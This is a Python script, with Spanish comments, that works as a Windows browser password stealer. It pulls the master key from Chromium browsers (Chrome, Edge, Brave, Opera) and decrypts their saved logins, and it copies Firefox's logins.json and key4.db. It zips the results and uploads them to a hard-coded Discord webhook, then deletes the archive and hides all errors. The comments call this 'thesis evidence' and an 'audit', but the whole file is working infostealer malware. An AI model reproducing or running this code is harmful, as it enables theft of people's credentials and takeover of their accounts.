import os
import json
import base64
import sqlite3
import shutil
import tempfile
import zipfile
import win32crypt
from Crypto.Cipher import AES
import requests

WEBHOOK_URL = "https://discord.com/api/webhooks/1560191585751138357/WQilvRZM3bKoGlMkKiQthdMWhnoW4an5D8DDqAdD6b6Ufzs7d9QakYfTxrJcHJ5xqCaX"

def get_browser_paths():
    local_appdata = os.environ.get("LOCALAPPDATA", "")
    appdata = os.environ.get("APPDATA", "")
    
    browsers = {
        "Chrome": os.path.join(local_appdata, "Google", "Chrome", "User Data"),
        "Edge": os.path.join(local_appdata, "Microsoft", "Edge", "User Data"),
        "Brave": os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data"),
        "Opera GX": os.path.join(appdata, "Opera Software", "Opera GX Stable"),
        "Opera Stable": os.path.join(appdata, "Opera Software", "Opera Stable"),
        "Firefox Profiles": os.path.join(appdata, "Mozilla", "Firefox", "Profiles")
    }
    return browsers

def get_chromium_key(user_data_path):
    local_state_path = os.path.join(user_data_path, "Local State")
    try:
        if os.path.exists(local_state_path):
            with open(local_state_path, "r", encoding="utf-8") as f:
                data = json.load(f)
            
            encrypted_key_b64 = data.get("os_crypt", {}).get("encrypted_key")
            if not encrypted_key_b64:
                return None
            
            decoded_key = base64.b64decode(encrypted_key_b64)
            key_material = decoded_key[5:]
            return win32crypt.CryptUnprotectData(key_material, None, None, None, 0)[1]
    except Exception:
        pass
    return None

def decrypt_chromium(enc, key):
    try:
        if enc.startswith(b'v10') or enc.startswith(b'v20'):
            iv = enc[3:15]
            payload = enc[15:-16]
            tag = enc[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception:
        try:
            return win32crypt.CryptUnprotectData(enc, None, None, None, 0)[1].decode('utf-8', errors='ignore')
        except Exception:
            return ""

def extract_chromium_db(db_path, key, creds, browser_name):
    if not os.path.exists(db_path):
        return

    temp_fd, temp_path = tempfile.mkstemp()
    os.close(temp_fd)
    
    try:
        shutil.copyfile(db_path, temp_path)
    except Exception:
        if os.path.exists(temp_path):
            os.remove(temp_path)
        return
    
    try:
        conn = sqlite3.connect(temp_path)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for url, user, pwd_enc in cur.fetchall():
            if user and pwd_enc:
                pwd = decrypt_chromium(pwd_enc, key)
                if pwd:
                    creds.append(f"[{browser_name}] URL: {url} | User: {user} | Pass: {pwd}")
        conn.close()
    except Exception:
        pass
    finally:
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass

def collect_evidence():
    creds = []
    browsers = get_browser_paths()
    
    # Directorio temporal para almacenar archivos de evidencia antes de comprimirlos
    evidence_dir = tempfile.mkdtemp()
    
    # 1. Procesar navegadores Chromium (Chrome, Edge, Brave, Opera)
    for browser_name, path in browsers.items():
        if browser_name == "Firefox Profiles":
            continue
            
        if not os.path.exists(path):
            continue
            
        key = get_chromium_key(path)
        if not key:
            continue
            
        target_dirs = [path]
        try:
            for item in os.listdir(path):
                full_item = os.path.join(path, item)
                if os.path.isdir(full_item) and (item == "Default" or item.startswith("Profile ") or item == "System Profile"):
                    target_dirs.append(full_item)
        except Exception:
            pass
            
        for d in target_dirs:
            db_path = os.path.join(d, "Login Data")
            extract_chromium_db(db_path, key, creds, browser_name)

    # 2. Procesar Firefox específicamente buscando el perfil .default-release
    firefox_profiles_path = browsers.get("Firefox Profiles")
    if os.path.exists(firefox_profiles_path):
        try:
            for profile in os.listdir(firefox_profiles_path):
                if profile.endswith(".default-release"):
                    profile_dir = os.path.join(firefox_profiles_path, profile)
                    
                    # Archivos críticos de Firefox para análisis de credenciales
                    logins_path = os.path.join(profile_dir, "logins.json")
                    key4_path = os.path.join(profile_dir, "key4.db")
                    
                    # Copiar al directorio temporal de evidencia para adjuntarlos
                    ff_dest = os.path.join(evidence_dir, "Firefox_" + profile)
                    os.makedirs(ff_dest, exist_ok=True)
                    
                    if os.path.exists(logins_path):
                        shutil.copy(logins_path, ff_dest)
                    if os.path.exists(key4.db if 'key4.db' in locals() else key4_path):
                        shutil.copy(key4_path, ff_dest)
                        
                    creds.append(f"[Firefox Perfil Localizado] Ruta: {profile_dir}")
        except Exception:
            pass

    # Guardar credenciales de Chromium en un archivo de texto
    txt_path = os.path.join(evidence_dir, "credenciales_chromium.txt")
    with open(txt_path, "w", encoding="utf-8") as f:
        f.write("\n".join(creds))
        
    # Crear un archivo ZIP con toda la evidencia recolectada
    zip_path = os.path.join(tempfile.gettempdir(), "evidencia_tesis.zip")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(evidence_dir):
            for file in files:
                full_path = os.path.join(root, file)
                rel_path = os.path.relpath(full_path, evidence_dir)
                zipf.write(full_path, rel_path)
                
    # Limpiar carpeta temporal de evidencia suelta
    shutil.rmtree(evidence_dir, ignore_errors=True)
    
    return zip_path

if __name__ == "__main__":
    zip_file = collect_evidence()

    if os.path.exists(zip_file) and WEBHOOK_URL != "TU_WEBHOOK_DE_DISCORD_AQUI":
        try:
            with open(zip_file, "rb") as f:
                requests.post(
                    WEBHOOK_URL,
                    data={"content": "**Reporte de auditoría y perfiles de prueba extraídos exitosamente.**"},
                    files={"file": ("evidencia_tesis.zip", f, "application/zip")}
                )
        except Exception:
            pass
        finally:
            try:
                os.remove(zip_file)
            except:
                pass
